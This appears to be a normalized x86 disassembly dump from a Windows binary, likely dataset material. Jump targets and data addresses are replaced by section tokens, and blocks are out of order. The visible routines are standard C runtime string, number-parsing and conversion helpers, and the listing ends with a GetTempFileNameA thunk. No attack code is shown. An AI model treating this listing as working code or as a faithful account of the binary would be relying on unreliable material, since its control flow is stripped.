lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_41ea30
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_41ea70
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x3c ]
call sub_406900
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ecx ] eax
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x30 ] bl
je r-xdata
mov cl [ eax ]
push esi
mov esi [ ebp - 0x3c ]
push edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
lea edi [ eax + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebp - 0x1 ]
mov ecx [ esi + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x3c ]
push eax
movzx eax [ ebp - 0x1 ]
push 0x8
push eax
call sub_41a46c
mov esi [ ebp - 0x3c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x1 ] 0x2d
mov [ ebp - 0x8 ] edi
jne r-xdata
mov al [ edi ]
mov [ ebp - 0x1 ] al
inc edi
jmp r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ esi + 0xac ] 0x1
jle r-xdata
push 0x10
pop ecx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov al [ edi ]
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1 ] al
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp - 0x1 ] 0x30
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
mov edi eax
push edi
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x28 ] edx
call sub_40c7f0
mov [ ebp - 0x20 ] ebx
mov ebx [ esi + 0xc8 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x1 ] 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and eax 0x103
je r-xdata
movsx esi cl
sub esi 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] ecx
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec [ ebp - 0x8 ]
test al 0x8
jne r-xdata
lea eax [ ecx - 0x61 ]
cmp al 0x19
movsx eax cl
ja r-xdata
cmp esi [ ebp + 0x14 ]
jae r-xdata
mov al [ edi + 0x1 ]
add edi 0x2
mov [ ebp - 0x1 ] al
mov [ ebp - 0x8 ] edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
lea esi [ eax - 0x37 ]
sub eax 0x20
mov ecx [ ebp - 0x10 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0x18 ]
jb r-xdata
call sub_4078ae
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp - 0x14 ]
push [ ebp - 0x28 ]
push edi
call sub_41f150
xor ecx ecx
add eax esi
adc edx ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
ja r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x14 ] 0xffffffff
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
test eax eax
je r-xdata
and eax 0x2
je r-xdata
mov cl [ ebp - 0x1 ]
movzx eax cl
movzx eax [ ebx + eax * 2 ]
mov edx eax
and edx 0x4
je r-xdata
mov eax [ ebp - 0x1c ]
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x1c ]
jb r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x10 ] esi
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] ebx
ja r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] esi
jb r-xdata
jb r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x34 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x14 ] 0x0
ja r-xdata
ja r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jbe r-xdata
cmp esi [ ebp - 0x24 ]
jbe r-xdata
sub_41ed0d
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rwxdata ] eax
jne r-xdata
push eax
push rwxdata
jmp r-xdata
call sub_41ea70
add esp 0x14
pop ebp
retn
sub_41ed55
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rwxdata
jmp r-xdata
call sub_41ea70
add esp 0x14
pop ebp
retn
sub_41ed9e
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_41edd7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_41ed9e
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41b4bb
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_41b4bb
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_41ee97
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rwxdata ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41edd7
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_41ed9e
sub_41eede
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_4078ae
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_4078ae
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_41ef98
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_41eede
pop ebp
retn
sub_41efc2
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_41eede
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_41f003
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_4078ae
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_4078ae
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_40c7f0
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_4078ae
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_407823
mov eax esi
jmp r-xdata
sub_41f0ef
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
push edi
mov edi [ ebp + 0x10 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f003
pop edi
pop ebp
retn
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] eax
jae r-xdata
sub_41f124
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f003
pop edi
pop ebp
retn
sub_41f150
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_4056b0
mov [ rwxdata ] eax
call sub_404b40
mov eax 0x1
retn
GetTempFileNameA
jmp [ GetTempFileNameA@IAT ]
